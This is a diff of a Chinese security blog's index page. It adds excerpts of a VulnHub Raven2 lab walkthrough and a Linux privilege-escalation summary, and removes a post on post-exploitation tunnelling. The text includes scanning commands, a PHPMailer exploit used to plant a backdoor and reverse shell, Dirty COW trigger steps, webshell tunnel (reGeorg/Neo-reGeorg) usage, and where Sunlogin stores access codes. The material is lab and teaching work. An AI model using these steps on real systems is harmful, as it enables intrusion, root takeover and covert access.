@@ -144,6 +144,206 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-Raven2靶机渗透" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2022/02/25/Raven2%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/">Raven2靶机渗透</a>
+    </h1>
+  
+
+        
+        <a href="/2022/02/25/Raven2%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/" class="archive-article-date">
+  	<time datetime="2022-02-25T02:30:38.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-02-25</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Raven2靶机渗透"><a href="#Raven2靶机渗透" class="headerlink" title="Raven2靶机渗透"></a>Raven2靶机渗透</h1><p>因为头一次涉及到liunx mysqludf的提权，所以这一次对该靶机进行一次完整的渗透测试。</p>
+<p>靶机地址：</p>
+<p><a target="_blank" rel="noopener" href="https://download.vulnhub.com/raven/Raven2.ova">https://download.vulnhub.com/raven/Raven2.ova</a></p>
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220225103226230.png" alt="image-20220225103226230"></p>
+<p>搭建好并开机就好了。</p>
+<h2 id="1-信息收集"><a href="#1-信息收集" class="headerlink" title="1.信息收集"></a>1.信息收集</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.137.0/24 -sP 进行ping扫描</span><br></pre></td></tr></table></figure>
+
+<p>实现对网段的快速扫描</p>
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220225103456133.png" alt="image-20220225103456133"></p>
+<p>这里自己知道新靶机地址为192.168.137.143.</p>
+<p>再一次用nmap综合扫描该ip地址</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A 192.168.137.143</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220225104202348.png" alt="image-20220225104202348"></p>
+<p>使用浏览器访问该IP地址，发现是一个奇奇怪怪的网页。想到网页就想先扫cms，使用whatweb扫描该网址。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whatweb -v 192.168.137.143</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220225104353186.png" alt="image-20220225104353186"></p>
+<p>但是发现不了该网站的cms。</p>
+<p>于是使用目录扫描</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb http://192.168.137.143:80</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220225104437436.png" alt="image-20220225104437436"></p>
+<p>扫描的东西很多很多，只有一个个看，一个个点，访问到了vendor目录。并且在/PATH文件下找到了第一个flag</p>
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220225104554872.png" alt="image-20220225104554872"></p>
+<p>同时多做信息收集，可以发现该网站上搭建了phpmailer这个服务。</p>
+<h2 id="2-拿到权限"><a href="#2-拿到权限" class="headerlink" title="2.拿到权限"></a>2.拿到权限</h2><p>在kali命令行中输入searchsploit phpma13iler，寻找可用的exp</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit phpmailer</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220225105340388.png" alt="image-20220225105340388"></p>
+<p>这里我选择按照网上的方法来看，于是使用php/webapps/40974.py</p>
+<p>使用命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit -x exploits/php/webapps/40974.py</span><br></pre></td></tr></table></figure>
+
+<p>在本机中找到该文件复制下来，然后修改payload</p>
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220226171150109.png" alt="image-20220226171150109"></p>
+<p>之后使用命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 40974.py</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220226171021436.png" alt="image-20220226171021436"></p>
+<p>使用nc监听4444端口准备等待反弹shell。访问<code>192.168.137.143/contant.php</code>执行我们得后门，生成后门文件。随后访问<code>192.168.137.143/shell.php</code>得到反弹shell。</p>
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220226171512287.png" alt="image-20220226171512287"></p>
+<p>输入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>获得一个类似于交互式得shell。</p>
+<p>之后可以查找flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name &quot;flag*&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220226171822411.png" alt="image-20220226171822411"></p>
+<p>获得第二个flag</p>
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220226171905752.png" alt="image-20220226171905752"></p>
+<p>发现第三个flag是在<code>/var/www/html</code>（即表示网站服务下，所以可以直接访问该地址）</p>
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220226172412484.png" alt="image-20220226172412484"></p>
+<h2 id="3-UDF提权"><a href="#3-UDF提权" class="headerlink" title="3.UDF提权"></a>3.UDF提权</h2><p>接下来去找寻到/var/www/html/wordpress目录下有一个文件名为<code>wp-config.php</code>的文件。</p>
+<p>可以找到mysql数据库的用户名和密码</p>
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220226173258537.png" alt="image-20220226173258537"></p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2022/02/25/Raven2%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-Liunx提权总结" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2022/02/24/Liunx%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/">Liunx提权总结</a>
+    </h1>
+  
+
+        
+        <a href="/2022/02/24/Liunx%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/" class="archive-article-date">
+  	<time datetime="2022-02-24T01:00:25.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-02-24</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Liunx提权总结"><a href="#Liunx提权总结" class="headerlink" title="Liunx提权总结"></a>Liunx提权总结</h1><h2 id="Liunx内核提权"><a href="#Liunx内核提权" class="headerlink" title="Liunx内核提权"></a>Liunx内核提权</h2><h3 id="Cve-2016-5195"><a href="#Cve-2016-5195" class="headerlink" title="Cve-2016-5195"></a>Cve-2016-5195</h3><p>脏牛漏洞，又叫Dirty COW，存在Liunx内核中已经有长达9年的时间，在2007年发布的liunx内核版本中就已经存在此漏洞。Linux kernel团队在2016年10月18日已经对此进行了修复。</p>
+<p>该漏洞具体为，Liunx内核的内存子系统在处理写入时复制时产生了竞争条件(race confition)。恶意用户可以利用此漏洞，来获取高权限，对只读内存映射进行访问。竞争条件，指的是任务执行顺序异常，这样可能会导致应用崩溃，或者是令攻击者有机可乘，进一步执行其他代码。利用这一漏洞，攻击者可在其目标系统提升权限，甚至可能获得root权限。</p>
+<p>Liunx内核&gt;=2.6.22</p>
+<p>触发代码:<a target="_blank" rel="noopener" href="https://github.com/dirtycow/dirtycow.github.io/blob/master/dirtyc0w.c">https://github.com/dirtycow/dirtycow.github.io/blob/master/dirtyc0w.c</a></p>
+<p>代码分析：</p>
+<p>main函数将用户输入的只读文件mmap映射，flag参数是map_private其只读。map_private属性会对此内存写入时，创建一个cow的副本，然后创建2个线程<code>madviseThread</code>和<code>procselfmenThread</code>，其中<code>procselfmenThread</code>通过<code>/proc/self/mem</code>文件尝试向被映射的内存不断写入数据，<code>madviseThread</code>则不断调用取消映射，两个线程不断操作。竞争条件触发只读文件写入权限，流畅在内核代码中。</p>
+<p>触发方式:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#echo this is not a test &gt; foo</span><br><span class="line">#chmod 0404 foo</span><br><span class="line">$ ls -lah foo</span><br><span class="line">-r-----r-- 1 root root 19 Oct 20 15:23 foo</span><br><span class="line">$ cat foo</span><br><span class="line">this is not a test</span><br><span class="line">$ gcc -pthread dirtyc0w.c -o dirtyc0w</span><br><span class="line">$ ./dirtyc0w foo m00000000000000000</span><br><span class="line">mmap 56123000</span><br><span class="line">madvise 0</span><br><span class="line">procselfmem 1800000000</span><br><span class="line">$ cat foo</span><br><span class="line">m00000000000000000</span><br></pre></td></tr></table></figure>
+
+<p>exp1:<a target="_blank" rel="noopener" href="https://github.com/FireFart/dirtycow">https://github.com/FireFart/dirtycow</a></p>
+<p>exp2:<a target="_blank" rel="noopener" href="https://github.com/gbonacini/CVE-2016-5195">https://github.com/gbonacini/CVE-2016-5195</a></p>
+<p>将exp1上传到目标机器，使用gcc-pthread dirty.c -o dirty -lcrypt命令对dirty.c进行编译，生成一个dirty的可执行文件。</p>
+<p>将exp2上传到目标机器，解压，进入解压目录。</p>
+<p>执行make后生成可执行文件dcow，执行./dcow -s如果成功的话，就可以返回一个root权限的shell</p>
+<h4 id="测试环境："><a href="#测试环境：" class="headerlink" title="测试环境："></a>测试环境：</h4><p>这里直接使用网上靶场复现：</p>
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220224093022033.png" alt="image-20220224093022033"></p>
+<p>如果可以写入写入foo文件，表示该机器存在脏牛提权漏洞。</p>
+        
+          <a class="article-more-a" href="/2022/02/24/Liunx%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/#more">more >></a>
+        
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2022/02/24/Liunx%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-内网穿透" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -167,185 +367,9 @@
         <h1 id="内网穿透的概念"><a href="#内网穿透的概念" class="headerlink" title="内网穿透的概念"></a>内网穿透的概念</h1><p>内网穿透，也叫NAT穿透，进行NAT穿透是为了使具有某一个特定源ip地址和源端口号的数据包不被NAT设备屏蔽而正确路由到内网主机</p>
 <h1 id="正向代理和反向代理"><a href="#正向代理和反向代理" class="headerlink" title="正向代理和反向代理"></a>正向代理和反向代理</h1><h2 id="什么是代理"><a href="#什么是代理" class="headerlink" title="什么是代理"></a>什么是代理</h2><p>代理就是中介，A和B之间有一个中间C，C就是中介。</p>
 <p>刚开始的时候，代理多数是帮助内网client访问外网server用的，后来出现了反向代理，“反向”这个词在这儿的意思是指方向相反，即代理将来自外网客户端的请求转发到内网服务器，从外到内。</p>
-<h2 id="正向代理"><a href="#正向代理" class="headerlink" title="正向代理"></a>正向代理</h2><p>正向代理类似一个跳板机，代理访问外部资源。（比如国内访问谷歌）</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220221142927845.png" alt="image-20220221142927845"></p>
-<p>我们在获得外网服务器的一定权限后发现这台服务器可以直接或者间接的访问内网，此时渗透测试进入后渗透阶段，一般情况下，内网中的其他机器是不允许来自外网机器的访问的。这时候，我们可以将这台外网服务器设置成为代理，使得我们自己的攻击机可以直接访问与操作内网中其他机器。</p>
-<p>按照代理协议在TCP/IP协议栈中的所处的位置，可以将正向代理分为HTTP代理和SOCKS代理。HTTP代理技术要求所有代理流量按照HTTP协议进行传输，使用SOCKS代理技术则可以直接在网络层传输代理数据包。HTTP代理工作在应用层，SOCKS代理工作在网络层，所以SOCKS代理技术比HTTP代理快得多。</p>
-<h2 id="反向代理"><a href="#反向代理" class="headerlink" title="反向代理"></a>反向代理</h2><p>反向代理(Reverse Proxy)实际的运行方式是指以代理服务器来接受internet上的连接请求，然后将请求转发给内部网络上的服务器，并将从服务器上得到的结果返回给internet上请求连接的客户端，此时代理服务器对外就表现为一个服务器</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220221145913060.png" alt="image-20220221145913060"></p>
-<h2 id="socks协议"><a href="#socks协议" class="headerlink" title="socks协议"></a>socks协议</h2><p>Socks协议又被称为防火墙安全会话转换协议，工作在OSI参考模型的第五层（会话层）</p>
-<p>它是一种可以穿透防火墙的协议，很多场景都会用到。</p>
-<p>因为<code>Socks</code>介于传输层与表示层之间，使用TCP协议传输数据，因而不提供传递<code>icmp</code>信息之类的</p>
-<p>目前有两个版本:<code>SOCKS4</code>和<code>SOCKS5</code></p>
-<p>SOCKS4支持<code>telent</code>，<code>ftphttp</code>等<code>tcp</code>协议</p>
-<p>SOCK5支持TCP与UDP，并支持安全认证方案</p>
-<p>PS:<code>Socks</code>不支持<code>ICMP</code>，不能使用<code>ping</code>命令</p>
-<h1 id="FRP内网穿透"><a href="#FRP内网穿透" class="headerlink" title="FRP内网穿透"></a>FRP内网穿透</h1><p>内网穿透原理是映射端口，能让外网的电脑找到处于内网的电脑，简单的来说就是局域网的服务外网访问不到，通过内网穿透技术来实现外网到内网的端口映射，进行实现外网访问内网服务。</p>
-<p>FRP是一个反向代理软件，它体积轻量但是功能强大，可以使处于内网或防火墙后的设备对外界提供服务，它支持HTTP、TCP、UDP等众多协议。我们今天仅讨论TCP和UDP相关的内容。（不支持SOCKS）</p>
-<p>搭建一个完整的frp服务链，我们需要：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.VPS一台（其实只要是具有公网IP的服务器就好）</span><br><span class="line">2.访问目标设备(就是你最终要访问的设备)</span><br></pre></td></tr></table></figure>
-
-<h2 id="服务端设置"><a href="#服务端设置" class="headerlink" title="服务端设置"></a>服务端设置</h2><p>ssh连接到VPS之后运行如下命令查看处理器架构，根据架构下载不同版本的Frp。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arch</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220221163856317.png" alt="image-20220221163856317"></p>
-<p>下载后解压出以下文件</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220221164751537.png" alt="image-20220221164751537"></p>
-<p>我们只需要关注<code>frps</code>,<code>frps.ini</code>,<code>frpc</code>,<code>frpc.ini</code>四个文件，前两个文件分别是服务端程序和服务端配置文件，后两个文件分别是客户端程序和客户端配置文件。</p>
-<p>修改frps.ini文件</p>
-<p>这个文件应该有如下格式</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind_port = 7000 </span><br><span class="line">dashboard_port = 7500</span><br><span class="line">token = 12345678 </span><br><span class="line">dashboard_user = admin</span><br><span class="line">dashboard_pwd = admin</span><br><span class="line">vhost_http_port = 10080</span><br><span class="line">vhost_https_port = 10443</span><br></pre></td></tr></table></figure>
-
-<p>如果没有必要，端⼝均可使⽤默认值，token、user和password项请⾃⾏设置。 </p>
-<p>“bind_port”表示⽤于客户端和服务端连接的端⼝，这个端⼝号我们之后在配置客户端的时候要⽤到。 </p>
-<p>“dashboard_port”是服务端仪表板的端⼝，若使⽤7500端⼝，在配置完成服务启动后可以通过浏览器访问 x.x.x.x:7500 （其中x.x.x.x为VPS的IP）查看frp服务运⾏信息。</p>
-<p> “token”是⽤于客户端和服务端连接的⼝令，请⾃⾏设置并记录，稍后会⽤到。</p>
-<p>“dashboard_user”和“dashboard_pwd”表示打开仪表板⻚⾯登录的⽤户名和密码，⾃⾏设置即可。</p>
-<p>“vhost_http_port”和“vhost_https_port”⽤于反向代理HTTP主机时使⽤，本⽂不涉及HTTP协议，因⽽照抄或 者删除这两条均可。</p>
-<p>之后我们就可以运行frps的服务端了</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./frps -c frps.ini</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220221165915365.png" alt="image-20220221165915365"></p>
-<p>此时如果访问x.x.x.x(你的公网ip地址):7500,并使用自己设置的用户名密码登录，即可看到仪表板界面。</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220221172004023.png" alt="image-20220221172004023"></p>
-<p>但是此时我们的服务端仅仅运行在前台，如果Ctrl+C停止或者关闭SSH窗口后，frps均会停止运行，因而我们使用nohup命令将其运行在后台</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nohup ./frps -c frps.ini &amp;   //带&amp;意味着即使终端关闭，或者电脑死机程序依然运行</span><br></pre></td></tr></table></figure>
-
-<p>输出如下内容表示正常运行</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nohup: ignoring input and appending output to &#x27;nohup.out&#x27;</span><br></pre></td></tr></table></figure>
-
-<p>此时用jobs可以查看运行的程序。</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220221172841289.png" alt="image-20220221172841289"></p>
-<h2 id="客户端设置"><a href="#客户端设置" class="headerlink" title="客户端设置"></a>客户端设置</h2><p>frp的客户端就是我们想要真正进行访问的那台设备，大多数情况下会是一台windows主机。</p>
-<p>依然根据系统版本下载对应的frp。用文本编辑器打开frpc.ini。与服务端类似，内容如下:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr = x.x.x.x</span><br><span class="line">server_port = 7000</span><br><span class="line">token = 12345678</span><br><span class="line">[rdp]</span><br><span class="line">type = tcp</span><br><span class="line">local_ip = 127.0.0.1</span><br><span class="line">local_port = 3389</span><br><span class="line">remote_port = 7001</span><br></pre></td></tr></table></figure>
-
-<p>其中common字段下的三项即为服务端的设置。</p>
-<p>“server_addr”为服务端IP地址，填⼊即可。 “server_port”为服务器端⼝，填⼊你设置的端⼝号即可，如果未改变就是7000 “token”是你在服务器上设置的连接⼝令，原样填⼊即可。</p>
-<p>frp实际使用时，会按照端口号进行转发，原理如下图所示：</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220221173418853.png" alt="image-20220221173418853"></p>
-<p>上面的frpc.ini的rdp，smb字段都是自己定义的规则，自定义端口对应时格式如下:</p>
-<p>“[xxx]” 表示一个规则名称，自己定义，便于查询即可。</p>
-<p>“type” 表示转发的协议类型，有TCP和UDP等选项可以选择，如有需要可以自行查阅frp手册。</p>
-<p>“local_port” 是本地应用的端口号，按照实际应用工作在本机的端口号填写即可。</p>
-<p>“remote_port” 是该条规则在服务端开放的端口号，自己填写并记录即可。</p>
-<p>RDP，即remote desktop远程桌面，windows的rdp默认端口是3389，协议为TCP，建议使用frp远程连接前，在局域网中测试号，能够成功连接后再使用frp穿透连接。</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220221174406245.png"></p>
-<p>这里就是把这台客户机上的rdp放在服务器上的7001号端口。</p>
-<p>配置好后再命令提示符下输入</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./frpc -c frpc.ini</span><br></pre></td></tr></table></figure>
-
-<p>不要关闭命令行（这样会造成frp连接的断联，如果想要保持长久连接，可以尝试加入windows的服务或者注册表里）接下来便可以使用相应的程序访问xxxx:xxxx（ip为vps的ip,端口为自定义的remote_port）即可访问到相应服务。</p>
-<p>比如我就可以使用自带的rdp，访问服务器上的7001端口，去控制被控制的windows端口。</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220221174751132.png" alt="image-20220221174751132"></p>
-<h1 id="Ngrok内网穿透"><a href="#Ngrok内网穿透" class="headerlink" title="Ngrok内网穿透"></a>Ngrok内网穿透</h1><p>ngrok是一个用go语言编写的反向代理，通过在公共的端点和本地运行的web服务器之间建立一个安全的通道。ngork可捕获和分析所有通道上的流量，便于后期分析和重放。</p>
-<h2 id="Ngrok是什么意思"><a href="#Ngrok是什么意思" class="headerlink" title="Ngrok是什么意思"></a>Ngrok是什么意思</h2><p>ngrok是一个反向代理，通过在公共的端点和本地运行的Web服务器之间建立一个安全的通道。Ngrok是国外发布的一个开源项目，也是一个公开的运行服务，但被国内墙掉了。国内一个机构建立并运营了一个ngrok运行服务器，地址为：<a target="_blank" rel="noopener" href="http://www.ngrok.cc/">http://www.ngrok.cc/</a> 。其支持http的80端口和tcp端口转发。</p>
-<h2 id="如何通过Ngrok实现内网穿透"><a href="#如何通过Ngrok实现内网穿透" class="headerlink" title="如何通过Ngrok实现内网穿透"></a>如何通过Ngrok实现内网穿透</h2><ol>
-<li>注册登录ngrok平台，申请一个ngrok.cc下的二级域名，并在基本信息里面获得token值。</li>
-</ol>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220221175848238.png" alt="image-20220221175848238"></p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220221175857524.png" alt="image-20220221175857524"></p>
-<ol start="2">
-<li><p>下载ngrok客户端并运行，输入token值即可。这样该机器就相当于一个web服务器。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ngrok-authtoken 密钥 -subdomain 二级域名 端口</span><br></pre></td></tr></table></figure></li>
-<li><p>接着访问就好了。</p>
-</li>
-</ol>
-<h1 id="reGeorg-Proxifier"><a href="#reGeorg-Proxifier" class="headerlink" title="reGeorg+Proxifier"></a>reGeorg+Proxifier</h1><p>reGeorg利用了socks5协议建立隧道，结合Proxifier可将目标内网代理出来。</p>
-<p><a target="_blank" rel="noopener" href="https://github.com/sensepost/reGeorg">https://github.com/sensepost/reGeorg</a></p>
-<p>该文件下支持php,ashx,asp,jsp,aspx</p>
-<p>根据服务器支持语言，选择脚本上传到服务器端，访问显示”Geory says,’All seems fine’”，表示脚本运行正常。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 reGeorgSocksProxy.py -p 9999 -u http;//url:port/tunnel/tunnel.jsp</span><br></pre></td></tr></table></figure>
-
-<p>运行reGeofy监听9999端口，程序卡在”Georg says,’All seems fine’”，表示正常运行</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220221181140138.png" alt="image-20220221181140138"></p>
-<p>下面配置Proxifier，运行Proxifier之后设置代理。</p>
-<ol>
-<li>设置代理服务器，127.0.0.1（本机地址）+-p指定的端口</li>
-</ol>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220221181242396.png" alt="image-20220221181242396"></p>
-<ol start="2">
-<li><p>设置代理的规则（推荐），动作这里会有三个状态，Direct(放行)，Block（阻塞），Proxy（代理）。这里可以设置需要代理的内容，以及放行的程序。</p>
-<p><img src="C:\Users\59559\AppData\Roaming\Typora\typora-user-images\image-20220221181343812.png" alt="image-20220221181343812"></p>
-</li>
-</ol>
-<p>也可以通过右击需要代理的程序进行代理，选择proxifier proxy socks5 127.0.0.1 进行远程连接。</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220221181511904.png" alt="image-20220221181511904"></p>
-<h1 id="Neo-reGeorg"><a href="#Neo-reGeorg" class="headerlink" title="Neo-reGeorg"></a>Neo-reGeorg</h1><p>Neo-reGeory是一个重构reGeorg的项目，目的是:</p>
-<ol>
-<li>提高了tunnel连接安全性</li>
-<li>提高可用性，避免特征检测</li>
-<li>提高传输内容保密性</li>
-<li>应对更多的网络环境场景</li>
-</ol>
-<h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><p>1.使用命令行生成后门.</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python neoreg.py generate -k solkatt -k表示你的密码</span><br></pre></td></tr></table></figure>
-
-
-
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220222163909757.png" alt="image-20220222163909757"></p>
-<p>之后便会在neoreg_servers文件夹下生成后门文件</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220222164009222.png" alt="image-20220222164009222"></p>
-<p>在生成的websehll中选择目标机器对应语言的后门上传。这里我选择的是php。</p>
-<p>在本机中使用如下命令监听端口：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python neoreg.py -k solkatt -u http://192.168.52.143/tunnel.php -p 4444</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220222164605983.png" alt="image-20220222164605983"></p>
-<p>表示建立隧道成功。</p>
-<p>接下来我可以使用proxifier来使用该隧道，在服务里添加规则就好</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220222164855369.png" alt="image-20220222164855369"></p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220222164914242.png" alt="image-20220222164914242"></p>
-<h1 id="向日葵代理及teamviewer"><a href="#向日葵代理及teamviewer" class="headerlink" title="向日葵代理及teamviewer"></a>向日葵代理及teamviewer</h1><p>重要⽂件config.ini </p>
-<p>向⽇葵的配置⽂件最重要的地⽅有三处，分别为：<code>encry_pwd</code>、<code>fastcode</code>、<code>fastcodehistory</code> </p>
-<p>encry_pwd 为本机验证码，为密⽂，不可解密 encry_pwd=wdtEBc/PIxU=</p>
-<p>fastcode 为本机识别码，为明⽂ fastcode=308976636</p>
-<p>fastcodehistory 为本机识别码历史，为密⽂，⽤ base64 解密即可，如果你的向⽇葵从来没有连接过别的主机， fastcodehistory 就为空</p>
